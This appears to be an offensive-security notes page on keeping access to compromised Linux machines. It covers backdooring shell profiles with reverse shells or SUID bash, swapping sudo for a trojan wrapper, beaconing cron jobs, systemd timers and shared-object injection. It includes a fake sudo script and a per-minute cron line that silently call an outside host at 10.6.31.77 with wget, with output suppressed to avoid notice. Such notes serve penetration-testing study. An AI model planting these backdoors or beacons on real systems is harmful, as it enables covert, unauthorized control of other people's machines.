# Linux Persistence

---

## Backdooring a User's Shell Profile

[[shell-profiles|Shell profiles]] execute whenever a user logs in or logs out. You can persist by placing **shell commands** inside one of these profiles.

### Process

1. Choose a user to persist as
2. Determine the user's default shell (in [[etc-passwd|/etc/passwd]])
3. Based on the user's default shell and the different [[shell-profiles#Shell Profile Execution Scenarios Order|shell profile execution scenarios and their orders]], choose a shell profile to infect
4. Write your **shell commands** to the target shell profile
	- Possible examples:
		- Reverse shell
		- Copy `bash` and set its [[suid|SUID]] bit

---

## `sudo` Wrapper

Replace the system's legitimate `sudo` executable with a program that proxies requests to the legitimate `sudo` executable and provides persistence.

### Process

1. Elevate to a `root` shell
2. Determine the full path of the legitimate `sudo` executable

```bash
$ which sudo
/usr/bin/sudo
```

3. Move the legitimate `sudo` executable elsewhere

```bash
mv /usr/bin/sudo /etc/sudo
```

4. Stage the malicious `sudo` proxy executable. This program should perform a covert persistance function and then call `sudo` with all the command line arguments, suppressing any output to `stdout` and `stderr`. A `bash` example whose convert function is to make an HTTP request to a web server:

```bash
#!/bin/bash
wget http://10.6.31.77/sudo 1>/dev/null 2>&1
/etc/sudo $@
```

5. Set the malicious `sudo` proxy executable's executable permission.

---

## `cron` Job

Schedule a `cron` job to execute a persistence command at a particular time interval.

### Process

1. Select the target user to persist as
2. [[cron#Set Up a Cron Job|Schedule the cron job as the target user]]
	- Keep in mind that by default, `cron` sends an email of output to the owner of the `cron` confguration file when it runs. Be sure to suppress all output to `stdout` and `stderr` to prevent this
	- Example persistence command to make an HTTP request to a web server:

```bash
* * * * * wget http://10.6.31.77/cron 1>/dev/null 2>&1
```

---

## `systemd` Timer

Create a malicious `systemd` service and schedule it to run at a particular time interval via a `systemd` timer.

### Process

1. Elevate to a `root` shell
2. [[systemd#Create a systemd Service|Create the persistence service]]
	- Be sure to specify `$TARGET_USERNAME` as the target user to persist as
3. [[systemd#Schedule a systemd Timer|Schedule a systemd timer for the persistence service]]
	- Be sure to customize the execution interval
4. Start the timer and optionally enable it

```bash
systemctl start $NAME_OF_SERVICE
systemctl enable $NAME_OF_SERVICE
```

---

## Shared Object File Injection

Replace a shared object file that is regularly imported by an elevated process with an arbitrary payload.

### Process

Follow  the [[shared-object-file-injection#Process|shared object file injection process]], keeping in mind that if you have elevated access and are trying to persist that access, you can overwrite pretty much any shared object file you want, whether it exists or not.

---

## References

[Hackers Vanguard - Establishing Persistenc with systemd Timers](https://hackersvanguard.com/establishing-persistence-systemd-timers/)
